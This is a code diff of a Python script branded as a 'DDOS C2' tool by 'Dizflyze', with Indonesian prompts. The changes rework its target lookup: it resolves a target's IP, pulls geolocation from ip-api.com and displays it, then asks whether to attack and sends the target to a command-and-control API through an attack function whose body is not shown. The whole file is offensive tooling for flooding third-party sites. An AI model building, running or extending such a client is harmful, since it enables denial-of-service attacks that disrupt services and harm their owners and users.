@@ -1,22 +1,21 @@
 import os
-import time
 import asyncio
 import aiohttp
+import requests
 from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
-from rich.progress import Progress
 
 console = Console()
 
 def L():
     os.system('cls' if os.name == 'nt' else 'clear')
     console.print(Panel.fit("""
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣧
-⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Author : Dizflyze
-⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] DDOS C2
+⠀⠀⠀⠀⠀⠀  ⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  [ # ] Dizflyze
+⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿  [ # ] DDOS
 ⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Version : v1.3.2
 ⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26 MEI 2025
 ⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
@@ -41,9 +40,19 @@ def NU(user_input):
         parsed = parsed._replace(netloc=parsed.path, path='')
     return requests.utils.urlunparse(parsed)
 
-async def fetch_info(session, api_url, target):
+async def fetch_info(session, target):
+    parsed = requests.utils.urlparse(target)
+    domain = parsed.netloc
+    if not domain:
+        domain = parsed.path
+    import socket
     try:
-        async with session.get(f"{api_url}/info?target={target}") as resp:
+        ip = socket.gethostbyname(domain)
+    except:
+        return None
+    url = f"http://ip-api.com/json/{ip}"
+    try:
+        async with session.get(url) as resp:
             if resp.status != 200:
                 return None
             return await resp.json()
@@ -60,7 +69,7 @@ async def attack_target(session, api_url, target):
         return False
 
 async def process_target(session, api_url, target):
-    info = await fetch_info(session, api_url, target)
+    info = await fetch_info(session, target)
     if not info:
         console.print(f"[red]Gagal mendapatkan info target: {target}[/red]")
         return
@@ -68,9 +77,8 @@ async def process_target(session, api_url, target):
     table.add_column("Field", style="cyan")
     table.add_column("Value", style="magenta")
     for k, v in info.items():
-        table.add_row(k, str(v))
+        table.add_row(str(k), str(v))
     console.print(table)
-
     choice = console.input(f"Serang target {target}? (y/n): ")
     if choice.lower() == 'y':
         success = await attack_target(session, api_url, target)
